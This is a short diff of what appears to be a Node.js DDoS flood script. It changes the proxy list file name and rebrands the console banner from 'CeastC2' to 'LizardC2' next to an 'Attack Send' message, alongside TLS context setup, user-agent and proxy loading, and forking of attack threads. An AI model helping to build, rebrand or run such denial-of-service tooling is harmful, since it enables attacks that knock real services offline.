@@ -52,7 +52,7 @@
  
  const secureContext = tls.createSecureContext(secureContextOptions);
  
- var proxyFile = "alive2.txt";
+ var proxyFile = "proxy.txt";
  var proxies = readLines(proxyFile);
  var userAgents = readLines("ua.txt");
  
@@ -68,7 +68,7 @@
  if (cluster.isMaster) {
     for (let counter = 1; counter <= args.threads; counter++) {
     	console.clear();
-        console.log('\x1b[32m(CeastC2) \x1b[94mAttack Send\x1b[0m');
+        console.log('\x1b[32m(LizardC2) \x1b[94mAttack Send\x1b[0m');
         //console.log("Threads " + counter +  " started.");
         cluster.fork();
     }
